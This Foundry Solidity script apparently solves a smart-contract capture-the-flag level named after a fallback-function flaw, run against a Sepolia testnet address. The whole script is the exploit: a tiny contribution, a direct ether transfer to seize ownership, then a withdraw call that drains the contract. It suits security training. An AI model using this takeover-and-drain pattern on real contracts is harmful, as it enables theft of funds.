// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Script, console} from "forge-std/Script.sol";
import {IFallback} from "../src/level1.sol";

contract Level1Script is Script {
    error TransferFailed();

    address payable target;

    function run() external {
        target = payable(0x088a87a38098230D078dCC12d3ba315B84f05EC0);
        vm.startBroadcast();
        IFallback(target).contribute{value: 0.0001 ether}();
        (bool success, ) = target.call{value: 0.0001 ether}("");
        if (!success) {
            revert TransferFailed();
        }
        IFallback(target).withdraw();
        vm.stopBroadcast();

        address newOwner = IFallback(target).owner();
        console.log("Attack finished. New owner is:", newOwner);
    }
}
//forge script script/level1.s.sol:Level1Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account Youraccount
